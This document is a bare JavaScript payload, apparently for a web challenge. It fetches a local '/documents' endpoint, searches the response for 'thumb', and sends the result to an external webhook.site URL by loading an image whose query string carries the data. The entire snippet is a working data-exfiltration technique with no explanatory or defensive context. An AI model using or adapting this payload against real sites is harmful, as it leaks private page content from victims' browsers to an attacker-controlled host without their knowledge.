var doc;
fetch('http://localhost:3000/documents')
  .then(res => {
    return res.text();
})
.then(data => {
    htmldata = data;
    doc = htmldata.search("thumb");
    var img1 = document.createElement('img');
    img1.src = 'https://webhook.site/647ee77d-c9b6-4fb9-be97-a23d43d93a15/image.png?doc='+doc;
    document.body.appendChild(img1);
});


